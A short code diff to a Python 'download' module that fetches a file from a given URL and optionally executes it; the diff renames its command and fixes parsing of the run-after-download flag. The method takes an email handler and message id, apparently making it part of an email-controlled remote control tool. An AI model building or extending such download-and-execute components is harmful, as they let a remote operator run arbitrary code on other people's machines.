@@ -8,10 +8,10 @@ import platform
 
 class download:
     def __init__(self):
-        self.name = "urlDownload"
+        self.name = "download"
         self.info = "Downloads a file from Given Url and Executes It(Not plain text file only bytes)"
         self.args = ["Url: Url To Download","Name: Name to Save the file","Bool: True of False to run after execution"]
-        self.command = ":urldown,Url,Name,Bool"
+        self.command = ":download,Url,Name,Bool"
     
     def open_file(self,filename):
         if platform.system() == "Windows":
@@ -51,6 +51,8 @@ class download:
             print(reason)
     
     def run(self,url,filename,run,EmailHandler,msgId):
+        if run.startswith("True"):
+            run=True
         resp = self.download_file(
             Url=url,
             filename=filename,
